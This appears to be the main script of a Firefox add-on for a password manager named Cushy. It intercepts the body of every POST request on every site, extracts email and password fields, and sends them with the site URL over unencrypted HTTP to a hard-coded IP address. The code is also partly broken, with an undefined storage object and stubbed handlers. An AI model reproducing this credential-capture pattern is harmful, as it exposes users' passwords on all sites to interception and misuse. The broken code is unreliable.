const {Cc, CC, Ci, Cu, Components} = require("chrome");
var notifications = require("sdk/notifications");
var data = require("sdk/self").data;
var storage = require("sdk/simple-storage").storage;
var Request = require("sdk/request").Request;
var tabs = require("sdk/tabs");
var url = require("sdk/url");
var buttons = require('sdk/ui/button/action');

var button = buttons.ActionButton({
  id: "cushy-link",
  label: "Visit Cushy",
  icon: {
    "16": "./logo_mini.png",
    "32": "./logo_mid.png"
  },
  onClick: handleClick
});

function handleClick(state) {
  tabs.open("https://cushy-staging.herokuapp.com/");
}

var tsd = require("temp_storage_data");
var cl = require("client");
var stc = require("storage_client");

var tempData = tsd.TempStorageData;
var client = cl.Client;
console.log(client.url);

var storageClient = stc.StorageClient;
var workers = [];

var pageMod = require("sdk/page-mod").PageMod({
  include: "*",
  contentScriptFile: [
    data.url("storage_client.js"),
    data.url("save_dialog.js"),
    data.url("local_data.js"),
    data.url("form.js"),
    data.url("password_generator.js"),
    data.url("content_frame.js")
  ],
  onAttach: function(worker) {
    workers.push(worker);
    worker.port.on("fillAccountCheck", function(elementContent) {
      //var accouts = storage.accouts;
      //var domain = client.domain;
      //if(accouts && accouts[domain]){
       // worker.port.emit("fillAccount", accouts[domain]);
      //});
    });
    worker.port.on("signIn", function(elementContent) {
      //tempData.setFromRequest(request);
    });
    worker.port.on("signUp", function(elementContent) {
      //tempData.type = null;
    });
    worker.port.on("dialogClose", function(elementContent){
      //client.toCloseDialog();
      //tempData.clear();
    });
  }
});

var tab = tabs.activeTab;

tab.on('ready', function(){
  console.log(client);
  client.updateUrl(tab.url);
  client.updateStorageData();
});

var httpRequestObserver =
{
 observe: function(subject, topic, data) {
    if (topic == 'http-on-modify-request') {
      var postData = observeRequest(subject, topic, data);
      if(postData != null){
        var postDateArr = postData.split("&");
        var loginName, password;





        for (var i = 0, len = postDateArr.length; i < len; i++) {
          if(postDateArr[i].match(/mail/)){
            loginName = postDateArr[i].split("=").pop().replace("%40", "@");
          }
          if(postDateArr[i].match(/password/)){
            password = postDateArr[i].split("=").pop();
          }
        }
        if(loginName != null && password != null){
          if(ss.storage.myObject["login_name"] != loginName || ss.storage.myObject["password"] != password ){
            ss.storage.myObject["login_name"] = loginName;
            ss.storage.myObject["password"] = password;
            Request({
              url: "http://133.242.16.11:3000/apis/company_services",
              content: {
                company_id: 1,
                login_name: ss.storage.myObject["login_name"],
                password: ss.storage.myObject["password"],
                user_id: 1,
                url: ss.storage.myObject["site_url"]
              },
              onComplete: function (response) {
                showNotification();
                console.log(response)
              }
            }).post();
          }
        }
      }
     }
  },
  register: function()
  {
    var observerService = Cc["@mozilla.org/observer-service;1"]
            .getService(Ci.nsIObserverService);
    observerService.addObserver(this, "http-on-modify-request", false);
  }
};

const ScriptableInputStream = CC("@mozilla.org/scriptableinputstream;1","nsIScriptableInputStream","init");

function observeRequest(channel, topic, data) {
  let post = null;

  if (!(channel instanceof Ci.nsIHttpChannel) ||
    !(channel instanceof Ci.nsIUploadChannel)) {
    return post;
  }
  if (channel.requestMethod !== 'POST') {
    return post;
  }

  try {
    let us = channel.uploadStream;
    if (!us) {
      return post;
    }
    if (us instanceof Ci.nsIMultiplexInputStream) {
      // Seeking in a nsIMultiplexInputStream effectively breaks the stream.
      return post;
    }
    if (!(us instanceof Ci.nsISeekableStream)) {
      // Cannot seek within the stream :(
      return post;
    }

    let oldpos = us.tell();
    us.seek(0, 0);

    try {
      let is = new ScriptableInputStream(us);

      let available = Math.min(is.available(), 1 << 16);
      if (available) {
        post = is.read(available);
      }
    }
    finally {
      us.seek(0, oldpos);
    }
  }
  catch (ex) {
    Cu.reportError(ex);
  }
  return post;
}

function showNotification(){
//表示するpopup
  var tagAddPanel = require("sdk/panel").Panel({
    position: {
      right: 0,
      top: 0
    },
    width: 212,
    height: 200,
    contentURL: data.url("text-entry.html"),
    contentScriptFile: data.url("get-text.js")
  });
  tagAddPanel.show();
}

httpRequestObserver.register();
